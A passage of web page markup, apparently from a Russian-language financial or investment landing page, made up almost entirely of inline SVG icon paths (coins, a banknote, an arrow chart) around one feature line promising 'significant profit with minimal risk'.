                    <path
                      d="M73.1248 53.7499C68.0136 53.7499 66.5793 52.4632 66.4329 52.3168C66.1887 52.0727 66.1887 51.6771 66.4329 51.4331C66.6734 51.1927 67.0616 51.189 67.3044 51.4222C67.3532 51.4625 68.6386 52.5002 73.1248 52.5002C77.6792 52.5002 78.934 51.4308 78.9462 51.4211C79.1976 51.1965 79.5908 51.2051 79.8228 51.4528C80.0547 51.6981 80.056 52.0778 79.8167 52.317C79.6703 52.4634 78.2358 53.7499 73.1248 53.7499Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M73.1248 57.5C68.0136 57.5 66.5793 56.2134 66.4329 56.0668C66.1887 55.8227 66.1887 55.4273 66.4329 55.1831C66.6734 54.9427 67.0616 54.9389 67.3044 55.1723C67.3532 55.2125 68.6386 56.2501 73.1248 56.2501C77.6792 56.2501 78.934 55.1808 78.9462 55.1712C79.1976 54.9477 79.5908 54.9551 79.8228 55.2028C80.0547 55.4482 80.056 55.8278 79.8167 56.067C79.6703 56.2134 78.2358 57.5 73.1248 57.5Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M79.3748 52.5001C79.2196 52.5001 79.0648 52.4427 78.945 52.3279C78.8962 52.2875 77.6108 51.2499 73.1248 51.2499C68.5702 51.2499 67.3153 52.3193 67.3031 52.3289C67.0505 52.5536 66.66 52.545 66.4266 52.2972C66.1948 52.0519 66.1936 51.6722 66.4327 51.433C66.5793 51.2865 68.0134 50 73.1246 50C78.2357 50 79.6701 51.2866 79.8164 51.433C80.0607 51.6772 80.0607 52.0727 79.8164 52.3167C79.6945 52.4389 79.5347 52.5001 79.3748 52.5001Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M66.8748 56.25C66.5293 56.25 66.2498 55.9705 66.2498 55.6251V51.875C66.2498 51.5295 66.5293 51.25 66.8748 51.25C67.2203 51.25 67.4998 51.5295 67.4998 51.875V55.6251C67.4998 55.9703 67.2203 56.25 66.8748 56.25Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M79.3748 56.25C79.0293 56.25 78.7498 55.9705 78.7498 55.6251V51.875C78.7498 51.5295 79.0293 51.25 79.3748 51.25C79.7201 51.25 79.9996 51.5295 79.9996 51.875V55.6251C79.9996 55.9703 79.7201 56.25 79.3748 56.25Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M73.1248 47.4999C72.7793 47.4999 72.4998 47.2203 72.4998 46.8749V45.6249C72.4998 45.2795 72.7793 45 73.1248 45C73.4703 45 73.7498 45.2795 73.7498 45.6249V46.8749C73.7498 47.2203 73.4703 47.4999 73.1248 47.4999Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M76.8748 47.1938C76.5294 47.1938 76.2498 46.9141 76.2498 46.5688V45.3358C76.2498 44.9904 76.5294 44.7109 76.8748 44.7109C77.2203 44.7109 77.4998 44.9904 77.4998 45.3358V46.5688C77.4998 46.9141 77.2203 47.1938 76.8748 47.1938Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M69.3749 47.1816C69.0295 47.1816 68.75 46.9021 68.75 46.5565V45.3189C68.75 44.9734 69.0295 44.6938 69.3749 44.6938C69.7204 44.6938 69.9999 44.9734 69.9999 45.3189V46.5565C69.9999 46.9021 69.7204 47.1816 69.3749 47.1816Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M73.1248 45C68.0136 45 66.5793 43.7132 66.4329 43.5668C66.1887 43.3227 66.1887 42.9273 66.4329 42.6831C66.6734 42.4427 67.0616 42.439 67.3044 42.6722C67.3532 42.7125 68.6386 43.7502 73.1248 43.7502C77.6792 43.7502 78.934 42.6808 78.9462 42.6711C79.1976 42.4465 79.5908 42.4551 79.8228 42.7028C80.0547 42.9482 80.056 43.3278 79.8167 43.567C79.6703 43.7132 78.2358 45 73.1248 45Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M73.1248 48.7499C68.0136 48.7499 66.5793 47.4632 66.4329 47.3168C66.1887 47.0727 66.1887 46.6771 66.4329 46.4331C66.6734 46.1927 67.0616 46.189 67.3044 46.4222C67.3532 46.4625 68.6386 47.5002 73.1248 47.5002C77.6792 47.5002 78.934 46.4308 78.9462 46.4211C79.1976 46.1977 79.5908 46.2051 79.8228 46.4528C80.0547 46.6981 80.056 47.0778 79.8167 47.317C79.6703 47.4634 78.2358 48.7499 73.1248 48.7499Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M79.3748 43.7501C79.2196 43.7501 79.0648 43.6927 78.945 43.5779C78.8962 43.5377 77.6108 42.4999 73.1248 42.4999C68.5702 42.4999 67.3153 43.5693 67.3031 43.579C67.0505 43.8037 66.66 43.7951 66.4266 43.5474C66.1948 43.302 66.1936 42.9224 66.4327 42.683C66.5793 42.5365 68.0134 41.25 73.1246 41.25C78.2357 41.25 79.6701 42.5366 79.8164 42.683C80.0607 42.9274 80.0607 43.3228 79.8164 43.5668C79.6945 43.6889 79.5347 43.7501 79.3748 43.7501Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M66.8748 47.5002C66.5293 47.5002 66.2498 47.2205 66.2498 46.8751V43.125C66.2498 42.7797 66.5293 42.5 66.8748 42.5C67.2203 42.5 67.4998 42.7797 67.4998 43.125V46.8751C67.4998 47.2205 67.2203 47.5002 66.8748 47.5002Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M79.3748 47.5002C79.0293 47.5002 78.7498 47.2205 78.7498 46.8751V43.125C78.7498 42.7797 79.0293 42.5 79.3748 42.5C79.7201 42.5 79.9996 42.7797 79.9996 43.125V46.8751C79.9996 47.2205 79.7201 47.5002 79.3748 47.5002Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M70.6248 17.5006C70.4783 17.5006 70.3319 17.4493 70.2135 17.3456C69.9534 17.1185 69.9266 16.7241 70.1548 16.4642L78.9046 6.46418C79.1317 6.20298 79.5271 6.17983 79.786 6.40553C80.0461 6.63264 80.073 7.02695 79.8447 7.28691L71.0949 17.2869C70.9714 17.4286 70.7981 17.5006 70.6248 17.5006Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M79.3761 7.50094C79.3553 7.50094 79.3334 7.49969 79.3126 7.49734L66.8125 6.2473C66.4696 6.21321 66.218 5.9068 66.2535 5.56379C66.2877 5.22078 66.6015 4.96191 66.9371 5.00461L79.4371 6.25465C79.7801 6.28891 80.0316 6.59532 79.9961 6.93833C79.9645 7.26038 79.6922 7.50094 79.3761 7.50094Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M5.62505 54.9998C5.43704 54.9998 5.25154 54.9155 5.12828 54.7546C4.91838 54.4797 4.97203 54.0867 5.24559 53.878C43.0907 25.0067 68.8512 12.6812 69.1075 12.5604C69.4175 12.4151 69.7911 12.5445 69.94 12.8582C70.0876 13.1695 69.9547 13.543 69.6422 13.6908C69.387 13.8116 43.7329 26.0883 6.00481 54.8717C5.8911 54.9584 5.75815 54.9998 5.62505 54.9998Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M0.624977 48.7499C0.427273 48.7499 0.230664 48.6548 0.109914 48.479C-0.0854433 48.1947 -0.0134941 47.805 0.271018 47.6098C39.8681 20.3875 67.612 8.90946 67.8879 8.79715C68.2091 8.6678 68.5727 8.81921 68.7035 9.13891C68.8341 9.45877 68.6814 9.82368 68.3616 9.95428C68.0869 10.0666 40.4551 21.5009 0.979092 48.6401C0.870386 48.7146 0.747134 48.7499 0.624977 48.7499Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M5.62624 54.9998C5.58479 54.9998 5.54334 54.9962 5.50299 54.9876C5.16358 54.9204 4.94397 54.5908 5.01217 54.2528L6.26221 48.0028C6.33056 47.6623 6.67482 47.4438 6.99703 47.512C7.33629 47.5792 7.55604 47.9088 7.48769 48.2469L6.23765 54.4968C6.17806 54.7948 5.91795 54.9998 5.62624 54.9998Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M6.87506 48.7499H0.62502C0.279663 48.7499 0 48.4704 0 48.1249C0 47.7795 0.279663 47.5 0.62502 47.5H6.87506C7.22042 47.5 7.50008 47.7795 7.50008 48.1249C7.50008 48.4704 7.22042 48.7499 6.87506 48.7499Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M73.1248 37.5008C69.3347 37.5008 66.2498 34.4161 66.2498 30.6258C66.2498 26.8354 69.3347 23.752 73.1248 23.752C76.915 23.752 79.9997 26.8354 79.9997 30.6258C79.9997 34.4161 76.9151 37.5008 73.1248 37.5008ZM73.1248 25.002C70.023 25.002 67.4998 27.5252 67.4998 30.6258C67.4998 33.7276 70.023 36.2508 73.1248 36.2508C76.2266 36.2508 78.7498 33.7276 78.7498 30.6258C78.7498 27.5252 76.2266 25.002 73.1248 25.002Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M73.1248 40.001C69.3347 40.001 66.2498 36.9161 66.2498 33.126C66.2498 32.7806 66.5293 32.501 66.8748 32.501C67.2203 32.501 67.4998 32.7806 67.4998 33.126C67.4998 36.2278 70.023 38.751 73.1248 38.751C76.2266 38.751 78.7498 36.2278 78.7498 33.126C78.7498 32.7806 79.0293 32.501 79.3749 32.501C79.7202 32.501 79.9997 32.7806 79.9997 33.126C79.9997 36.9161 76.9151 40.001 73.1248 40.001Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M66.8748 33.7509C66.5293 33.7509 66.2498 33.4714 66.2498 33.1259V30.626C66.2498 30.2805 66.5293 30.001 66.8748 30.001C67.2203 30.001 67.4998 30.2805 67.4998 30.626V33.1259C67.4998 33.4714 67.2203 33.7509 66.8748 33.7509Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M79.3748 33.7509C79.0293 33.7509 78.7498 33.4714 78.7498 33.1259V30.626C78.7498 30.2805 79.0293 30.001 79.3748 30.001C79.7201 30.001 79.9996 30.2805 79.9996 30.626V33.1259C79.9996 33.4714 79.7201 33.7509 79.3748 33.7509Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M76.8748 38.7508C76.5294 38.7508 76.2498 38.4713 76.2498 38.1258V35.627C76.2498 35.2816 76.5294 35.002 76.8748 35.002C77.2203 35.002 77.4998 35.2816 77.4998 35.627V38.1258C77.4998 38.4713 77.2203 38.7508 76.8748 38.7508Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M73.1248 40.0009C72.7793 40.0009 72.4998 39.7213 72.4998 39.3759V36.876C72.4998 36.5305 72.7793 36.251 73.1248 36.251C73.4703 36.251 73.7498 36.5305 73.7498 36.876V39.3759C73.7498 39.7213 73.4703 40.0009 73.1248 40.0009Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M69.376 38.7508C69.0306 38.7508 68.7511 38.4713 68.7511 38.1258V35.627C68.7511 35.2816 69.0306 35.002 69.376 35.002C69.7215 35.002 70.001 35.2816 70.001 35.627V38.1258C70.0011 38.4713 69.7215 38.7508 69.376 38.7508Z"
                      fill="#116FFF"
                    ></path>
                    <path
                      d="M73.1248 33.751C72.7793 33.751 72.4998 33.4715 72.4998 33.126V28.126C72.4998 27.7805 72.7793 27.501 73.1248 27.501C73.4703 27.501 73.7498 27.7805 73.7498 28.126V33.126C73.7498 33.4715 73.4703 33.751 73.1248 33.751Z"
                      fill="#116FFF"
                    ></path>
                  </svg>
                </div>
                <p class="w-4/5 pl-3 text-lg sm:text-base sm:pl-4">
Значительная прибыль с минимальным риском                </p>
              </div>
              <div class="flex items-center mb-12">
                <div class="w-1/5">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="100%"
                    height="100%"
                    viewBox="0 0 80 80"
                    fill="none"
                  >
                    <g>
                      <path
                        d="M63.1001 48.1143H16.8987V53.1139H63.1001V48.1143Z"
                        fill="#5C9EFF"
                      ></path>
                      <path
                        d="M63.1001 26.8857H16.8987V48.1138H63.1001V26.8857Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M56.8573 45.6168H23.1423L19.3962 43.1195V31.8813L23.1423 29.3838H56.8573L60.6033 31.8813V43.1195L56.8573 45.6168Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M11.2799 76.8366C15.7625 76.8366 19.3964 73.2027 19.3964 68.72C19.3964 64.2374 15.7625 60.6035 11.2799 60.6035C6.79722 60.6035 3.16333 64.2374 3.16333 68.72C3.16333 73.2027 6.79722 76.8366 11.2799 76.8366Z"
                        fill="#5C9EFF"
                      ></path>
                      <path
                        d="M11.2799 74.34C15.7625 74.34 19.3964 70.7061 19.3964 66.2235C19.3964 61.7408 15.7625 58.1069 11.2799 58.1069C6.79722 58.1069 3.16333 61.7408 3.16333 66.2235C3.16333 70.7061 6.79722 74.34 11.2799 74.34Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M4.41159 66.223C4.41159 61.9511 7.71376 58.4575 11.9037 58.138C11.697 58.1221 11.4903 58.1064 11.2794 58.1064C6.79674 58.1064 3.16284 61.7403 3.16284 66.223C3.16284 70.7055 6.79674 74.3394 11.2794 74.3394C11.4903 74.3394 11.697 74.3236 11.9037 74.3078C7.71376 73.9883 4.41159 70.4945 4.41159 66.223Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M18.1473 66.223C18.1473 70.4945 14.8452 73.9883 10.655 74.3078C10.8617 74.3237 11.0685 74.3394 11.2794 74.3394C15.762 74.3394 19.3959 70.7055 19.3959 66.223C19.3959 61.7403 15.762 58.1064 11.2794 58.1064C11.0685 58.1064 10.8617 58.1222 10.655 58.138C14.8452 58.4575 18.1473 61.9511 18.1473 66.223Z"
                        fill="#5C9EFF"
                      ></path>
                      <path
                        d="M68.72 21.8932C73.2027 21.8932 76.8366 18.2593 76.8366 13.7767C76.8366 9.29405 73.2027 5.66016 68.72 5.66016C64.2374 5.66016 60.6035 9.29405 60.6035 13.7767C60.6035 18.2593 64.2374 21.8932 68.72 21.8932Z"
                        fill="#5C9EFF"
                      ></path>
                      <path
                        d="M68.7202 19.3961C73.2028 19.3961 76.8367 15.7622 76.8367 11.2796C76.8367 6.79698 73.2028 3.16309 68.7202 3.16309C64.2375 3.16309 60.6036 6.79698 60.6036 11.2796C60.6036 15.7622 64.2375 19.3961 68.7202 19.3961Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M61.8521 11.2796C61.8521 7.00791 65.1545 3.51433 69.3443 3.1948C69.1382 3.17887 68.9321 3.16309 68.7201 3.16309C64.2374 3.16309 60.6034 6.79713 60.6034 11.2796C60.6034 15.7623 64.2374 19.3961 68.7201 19.3961C68.9321 19.3961 69.1382 19.3802 69.3443 19.3644C65.1543 19.0451 61.8521 15.5513 61.8521 11.2796Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M75.5879 11.2799C75.5879 15.5516 72.2855 19.0454 68.0957 19.3649C68.3029 19.3807 68.5102 19.3966 68.7201 19.3966C73.2026 19.3966 76.8364 15.7627 76.8364 11.2801C76.8364 6.79762 73.2026 3.16357 68.7201 3.16357C68.5102 3.16357 68.3029 3.17951 68.0957 3.19529C72.2855 3.51467 75.5879 7.0084 75.5879 11.2799Z"
                        fill="#5C9EFF"
                      ></path>
                      <path
                        d="M28.1384 37.5C28.1384 38.5353 27.2987 39.3743 26.2634 39.3743C25.2281 39.3743 24.3884 38.5353 24.3884 37.5C24.3884 36.4634 25.2281 35.6245 26.2634 35.6245C27.2987 35.6245 28.1384 36.4636 28.1384 37.5Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M55.6109 37.5C55.6109 38.5353 54.7708 39.3743 53.7354 39.3743C52.7001 39.3743 51.86 38.5353 51.86 37.5C51.86 36.4634 52.7001 35.6245 53.7354 35.6245C54.7708 35.6245 55.6109 36.4636 55.6109 37.5Z"
                        fill="#94C1FF"
                      ></path>
                      <path
                        d="M63.1001 26.8857H16.8987V28.1373H63.1001V26.8857Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M63.1001 46.8623H16.8987V48.2196H63.1001V46.8623Z"
                        fill="#5C9EFF"
                      ></path>
                      <path
                        d="M18.1468 28.1377H16.8987V46.8626H18.1468V28.1377Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M63.1002 28.1377H61.8514V46.8626H63.1002V28.1377Z"
                        fill="#5C9EFF"
                      ></path>
                      <path
                        d="M48.1171 26.8857H31.8828V48.1138H48.1171V26.8857Z"
                        fill="white"
                      ></path>
                      <path
                        d="M48.1171 48.1143H31.8828V53.1139H48.1171V48.1143Z"
                        fill="#D7E9FF"
                      ></path>
                      <path
                        d="M68.72 20.0209C63.9007 20.0209 59.9791 16.0992 59.9791 11.28C59.9791 6.46077 63.9008 2.53906 68.72 2.53906C73.5392 2.53906 77.4608 6.46077 77.4608 11.28C77.4608 16.0992 73.5391 20.0209 68.72 20.0209ZM68.72 3.78765C64.5886 3.78765 61.2277 7.14842 61.2277 11.2798C61.2277 15.4112 64.5886 18.7721 68.72 18.7721C72.8513 18.7721 76.212 15.4114 76.212 11.2798C76.212 7.14826 72.8513 3.78765 68.72 3.78765Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M68.72 22.5181C63.9007 22.5181 59.9791 18.5964 59.9791 13.7772C59.9791 13.4322 60.2583 13.1528 60.6033 13.1528C60.9485 13.1528 61.2277 13.4322 61.2277 13.7772C61.2277 17.9086 64.5886 21.2695 68.72 21.2695C72.8513 21.2695 76.212 17.9088 76.212 13.7772C76.212 13.4322 76.4914 13.1528 76.8364 13.1528C77.1816 13.1528 77.4608 13.4322 77.4608 13.7772C77.4608 18.5966 73.5391 22.5181 68.72 22.5181Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M68.72 15.026C68.3748 15.026 68.0956 14.7468 68.0956 14.4016V8.15806C68.0956 7.81307 68.3748 7.53369 68.72 7.53369C69.065 7.53369 69.3442 7.81291 69.3442 8.15806V14.4016C69.3442 14.7468 69.065 15.026 68.72 15.026Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M76.8365 14.4015C76.4915 14.4015 76.2122 14.1223 76.2122 13.7771V11.2796C76.2122 10.9346 76.4915 10.6553 76.8365 10.6553C77.1817 10.6553 77.4609 10.9346 77.4609 11.2796V13.777C77.4609 14.1223 77.1817 14.4015 76.8365 14.4015Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M60.6031 14.4015C60.2581 14.4015 59.9789 14.1223 59.9789 13.7771V11.2796C59.9789 10.9346 60.2581 10.6553 60.6031 10.6553C60.9482 10.6553 61.2275 10.9346 61.2275 11.2796V13.777C61.2275 14.1223 60.9482 14.4015 60.6031 14.4015Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M68.72 22.5181C68.3748 22.5181 68.0956 22.2388 68.0956 21.8937V19.3963C68.0956 19.0513 68.3748 18.772 68.72 18.772C69.065 18.772 69.3442 19.0512 69.3442 19.3963V21.8937C69.3442 22.2388 69.065 22.5181 68.72 22.5181Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M73.0903 21.2391C72.7452 21.2391 72.4659 20.9599 72.4659 20.6148V18.1185C72.4659 17.7734 72.7452 17.4941 73.0903 17.4941C73.4355 17.4941 73.7147 17.7734 73.7147 18.1185V20.6148C73.7147 20.9599 73.4355 21.2391 73.0903 21.2391Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M64.3858 21.2389C64.0407 21.2389 63.7615 20.9597 63.7615 20.6145V18.1439C63.7615 17.7987 64.0407 17.5195 64.3858 17.5195C64.7308 17.5195 65.0101 17.7987 65.0101 18.1439V20.6145C65.0101 20.9597 64.7308 21.2389 64.3858 21.2389Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M30.634 46.2411H21.8937C21.5487 46.2411 21.2693 45.9619 21.2693 45.6167C21.2693 44.5839 20.4292 43.7438 19.3963 43.7438C19.0512 43.7438 18.772 43.4645 18.772 43.1194V31.8811C18.772 31.5361 19.0512 31.2568 19.3963 31.2568C20.4292 31.2568 21.2693 30.4166 21.2693 29.3837C21.2693 29.0387 21.5487 28.7593 21.8937 28.7593H30.634C30.979 28.7593 31.2583 29.0385 31.2583 29.3837C31.2583 29.7288 30.9791 30.008 30.634 30.008H22.4551C22.2063 31.2299 21.2418 32.1933 20.0206 32.4433V42.5572C21.2418 42.8072 22.2063 43.7706 22.4551 44.9925H30.634C30.979 44.9925 31.2583 45.2717 31.2583 45.6167C31.2582 45.9619 30.979 46.2411 30.634 46.2411Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M30.6339 51.2359H16.8988C16.5536 51.2359 16.2744 50.9567 16.2744 50.6117C16.2744 50.2665 16.5536 49.9873 16.8988 49.9873H30.6339C30.9789 49.9873 31.2583 50.2665 31.2583 50.6117C31.2581 50.9567 30.9789 51.2359 30.6339 51.2359Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M30.6339 53.7383H16.8988C16.5536 53.7383 16.2744 53.4591 16.2744 53.114C16.2744 52.769 16.5536 52.4897 16.8988 52.4897H30.6339C30.9789 52.4897 31.2583 52.769 31.2583 53.114C31.2581 53.4591 30.9789 53.7383 30.6339 53.7383Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M31.8824 53.738C31.5374 53.738 31.2581 53.4588 31.2581 53.1136V26.8861C31.2581 26.5411 31.5373 26.2617 31.8824 26.2617C32.2276 26.2617 32.5068 26.5409 32.5068 26.8861V53.1136C32.5068 53.4588 32.2276 53.738 31.8824 53.738Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M30.6339 48.7383H16.8988C16.5536 48.7383 16.2744 48.4591 16.2744 48.114C16.2744 47.769 16.5536 47.4897 16.8988 47.4897H30.6339C30.9789 47.4897 31.2583 47.769 31.2583 48.114C31.2581 48.4591 30.9789 48.7383 30.6339 48.7383Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M16.8985 48.7384C16.5534 48.7384 16.2742 48.4591 16.2742 48.114V26.8861C16.2742 26.5411 16.5534 26.2617 16.8985 26.2617C17.2435 26.2617 17.5229 26.5409 17.5229 26.8861V48.114C17.5229 48.4591 17.2437 48.7384 16.8985 48.7384Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M30.6339 27.5105H16.8988C16.5536 27.5105 16.2744 27.2312 16.2744 26.8861C16.2744 26.5409 16.5536 26.2617 16.8988 26.2617H30.6339C30.9789 26.2617 31.2583 26.5409 31.2583 26.8861C31.2583 27.2312 30.9789 27.5105 30.6339 27.5105Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M58.106 46.2411H49.3651C49.0199 46.2411 48.7407 45.9619 48.7407 45.6167C48.7407 45.2717 49.0199 44.9925 49.3651 44.9925H57.5438C57.794 43.7706 58.7572 42.8072 59.9791 42.5572V32.4433C58.7572 32.1933 57.794 31.2299 57.5438 30.008H49.3651C49.0199 30.008 48.7407 29.7288 48.7407 29.3837C48.7407 29.0385 49.0199 28.7593 49.3651 28.7593H58.106C58.451 28.7593 58.7302 29.0385 58.7302 29.3837C58.7302 30.4165 59.5705 31.2568 60.6032 31.2568C60.9483 31.2568 61.2276 31.536 61.2276 31.8811V43.1194C61.2276 43.4645 60.9483 43.7438 60.6032 43.7438C59.5705 43.7438 58.7302 44.5839 58.7302 45.6167C58.7302 45.9619 58.451 46.2411 58.106 46.2411Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M63.1008 51.2359H49.3651C49.0199 51.2359 48.7407 50.9567 48.7407 50.6117C48.7407 50.2665 49.0199 49.9873 49.3651 49.9873H63.1008C63.4458 49.9873 63.725 50.2665 63.725 50.6117C63.725 50.9567 63.4458 51.2359 63.1008 51.2359Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M63.1008 53.7383H49.3651C49.0199 53.7383 48.7407 53.4591 48.7407 53.114C48.7407 52.769 49.0199 52.4897 49.3651 52.4897H63.1008C63.4458 52.4897 63.725 52.769 63.725 53.114C63.725 53.4591 63.4458 53.7383 63.1008 53.7383Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M48.1162 53.738C47.7712 53.738 47.4919 53.4588 47.4919 53.1136V26.8861C47.4919 26.5411 47.7712 26.2617 48.1162 26.2617C48.4613 26.2617 48.7405 26.5409 48.7405 26.8861V53.1136C48.7405 53.4588 48.4613 53.738 48.1162 53.738Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M63.1008 48.7383H49.3651C49.0199 48.7383 48.7407 48.4591 48.7407 48.114C48.7407 47.769 49.0199 47.4897 49.3651 47.4897H63.1008C63.4458 47.4897 63.725 47.769 63.725 48.114C63.725 48.4591 63.4458 48.7383 63.1008 48.7383Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M63.1008 48.7384C62.7557 48.7384 62.4764 48.4591 62.4764 48.114V26.8861C62.4764 26.5411 62.7557 26.2617 63.1008 26.2617C63.4458 26.2617 63.725 26.5409 63.725 26.8861V48.114C63.725 48.4591 63.4458 48.7384 63.1008 48.7384Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M63.1008 27.5105H49.3651C49.0199 27.5105 48.7407 27.2312 48.7407 26.8861C48.7407 26.5409 49.0199 26.2617 49.3651 26.2617H63.1008C63.4458 26.2617 63.725 26.5409 63.725 26.8861C63.725 27.2312 63.4458 27.5105 63.1008 27.5105Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M48.1161 27.5105H31.8824C31.5374 27.5105 31.2581 27.2312 31.2581 26.8861C31.2581 26.5409 31.5373 26.2617 31.8824 26.2617H48.1161C48.4613 26.2617 48.7405 26.5409 48.7405 26.8861C48.7405 27.2312 48.4613 27.5105 48.1161 27.5105Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M45.6188 48.7383H34.3797C34.0347 48.7383 33.7554 48.4591 33.7554 48.114C33.7554 47.769 34.0347 47.4897 34.3797 47.4897H45.6188C45.9639 47.4897 46.2431 47.769 46.2431 48.114C46.2431 48.4591 45.9639 48.7383 45.6188 48.7383Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M48.1161 53.7383H31.8824C31.5374 53.7383 31.2581 53.4591 31.2581 53.114C31.2581 52.769 31.5373 52.4897 31.8824 52.4897H48.1161C48.4613 52.4897 48.7405 52.769 48.7405 53.114C48.7405 53.4591 48.4613 53.7383 48.1161 53.7383Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M26.2632 39.9974C24.8865 39.9974 23.7664 38.8766 23.7664 37.4999C23.7664 36.1232 24.8865 35.0024 26.2632 35.0024C27.6406 35.0024 28.7606 36.1232 28.7606 37.4999C28.7606 38.8766 27.6406 39.9974 26.2632 39.9974ZM26.2632 36.2513C25.5748 36.2513 25.0151 36.811 25.0151 37.5001C25.0151 38.1891 25.5748 38.7488 26.2632 38.7488C26.9517 38.7488 27.512 38.1891 27.512 37.5001C27.512 36.811 26.9517 36.2513 26.2632 36.2513Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M53.7354 39.9974C52.3585 39.9974 51.238 38.8766 51.238 37.4999C51.238 36.1232 52.3587 35.0024 53.7354 35.0024C55.1121 35.0024 56.2327 36.1232 56.2327 37.4999C56.2327 38.8766 55.1122 39.9974 53.7354 39.9974ZM53.7354 36.2513C53.0465 36.2513 52.4868 36.811 52.4868 37.5001C52.4868 38.1891 53.0465 38.7488 53.7354 38.7488C54.4243 38.7488 54.984 38.1891 54.984 37.5001C54.984 36.811 54.4243 36.2513 53.7354 36.2513Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M11.2795 74.9636C6.45965 74.9636 2.53857 71.0419 2.53857 66.2228C2.53857 61.4035 6.45981 57.4819 11.2795 57.4819C16.0991 57.4819 20.0204 61.4036 20.0204 66.2228C20.0205 71.0419 16.0993 74.9636 11.2795 74.9636ZM11.2795 58.7304C7.14809 58.7304 3.78732 62.0913 3.78732 66.2227C3.78732 70.3541 7.14809 73.7148 11.2795 73.7148C15.4109 73.7148 18.7716 70.3541 18.7716 66.2227C18.7716 62.0913 15.411 58.7304 11.2795 58.7304Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M11.2795 77.4613C6.45965 77.4613 2.53857 73.5396 2.53857 68.7206C2.53857 68.3754 2.81795 68.0962 3.16295 68.0962C3.5081 68.0962 3.78732 68.3754 3.78732 68.7206C3.78732 72.8518 7.14809 76.2127 11.2795 76.2127C15.4109 76.2127 18.7716 72.8518 18.7716 68.7206C18.7716 68.3754 19.0509 68.0962 19.396 68.0962C19.7412 68.0962 20.0204 68.3754 20.0204 68.7206C20.0205 73.5396 16.0993 77.4613 11.2795 77.4613Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M11.2794 69.9687C10.9344 69.9687 10.655 69.6895 10.655 69.3444V63.1009C10.655 62.7558 10.9344 62.4766 11.2794 62.4766C11.6246 62.4766 11.9038 62.7558 11.9038 63.1009V69.3444C11.9039 69.6895 11.6246 69.9687 11.2794 69.9687Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M19.3961 69.3446C19.0509 69.3446 18.7717 69.0653 18.7717 68.7203V66.223C18.7717 65.8779 19.0509 65.5986 19.3961 65.5986C19.7413 65.5986 20.0205 65.8779 20.0205 66.223V68.7203C20.0205 69.0653 19.7413 69.3446 19.3961 69.3446Z"
                        fill="#116FFF"
                      ></path>
                      <path
                        d="M3.16295 69.3446C2.81795 69.3446 2.53857 69.0653 2.53857 68.7203V66.223C2.53857 65.8779 2.81795 65.5986 3.16295 65.5986C3.5081 65.5986 3.78732 65.8779 3.78732 66.223V68.7203C3.78732 69.0653 3.5081 69.3446 3.16295 69.3446Z"
                        fill="#116FFF"
                      ></path>
                      <path
